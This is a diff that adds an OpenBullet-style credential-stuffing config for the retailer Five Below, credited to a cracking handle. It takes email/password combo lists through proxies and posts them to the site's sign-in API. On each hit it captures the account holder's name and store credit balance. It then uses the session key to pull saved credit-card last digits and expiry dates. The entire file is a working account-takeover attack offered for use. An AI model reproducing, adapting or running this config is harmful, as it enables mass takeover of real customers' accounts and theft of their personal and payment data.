@@ -1,0 +1,121 @@
+[SETTINGS]
+{
+  "Name": "Five Below(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-28T23:29:36.3937914+01:00",
+  "AdditionalInfo": "https://t.me/wolfcrack",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.fivebelow.com/api/sign_in?api_version=8&app_platform=android&app_version=5.30.20.00" 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json" 
+  HEADER "api_version: 8" 
+  HEADER "app_platform: android" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G965N Build/QP1A.190711.020)" 
+  HEADER "app_version: 5.30.20.00" 
+  HEADER "X-Hollar-Client-Id: qLqlyeGKunfSRUtTzYdO2QadBV-HEUec" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 60" 
+  HEADER "Host: www.fivebelow.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"Email not found\"}" 
+    KEY "Email and password does not match" 
+  KEYCHAIN Success OR 
+    KEY "invite_code" 
+
+PARSE "<SOURCE>" JSON "spree_api_key" -> VAR "key" 
+
+PARSE "<SOURCE>" JSON "full_name" CreateEmpty=FALSE -> CAP "Name" 
+
+PARSE "<SOURCE>" JSON "store_credits" CreateEmpty=FALSE -> CAP "Store Credit" "$" "" 
+
+REQUEST POST "https://www.fivebelow.com/api/platform/sales" 
+  CONTENT "{\"operationName\":null,\"variables\":{},\"query\":\"{  creditCards {    email    expirationMonth    expirationYear    id    lastDigits    name    __typename  }}\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.fivebelow.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 178" 
+  HEADER "x-app-version: 0.0.1, 0.0.1" 
+  HEADER "app_platform: web" 
+  HEADER "api_version: 8" 
+  HEADER "content-type: application/json" 
+  HEADER "accept: */*" 
+  HEADER "x-spree-token: <key>" 
+  HEADER "x-app-type: desktop" 
+  HEADER "X-Hollar-Client-Id: MInhGuOVg-ETRbZCIEsQpWnsktyiPzwu" 
+  HEADER "App-Platform: web" 
+  HEADER "Origin: https://www.fivebelow.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.fivebelow.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" EqualTo "{\"data\":{\"creditCards\":[]}}" 
+
+PARSE "<SOURCE>" JSON "__typename" CreateEmpty=FALSE -> CAP "Payment Method" 
+
+PARSE "<SOURCE>" JSON "lastDigits" Recursive=TRUE -> VAR "4" 
+
+PARSE "<SOURCE>" JSON "expirationMonth" Recursive=TRUE -> VAR "M" 
+
+PARSE "<SOURCE>" JSON "expirationYear" Recursive=TRUE -> VAR "Y" 
+
+FUNCTION Constant "<4[*]> / <M[*]> / <Y[*]>" -> CAP "Card Type" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
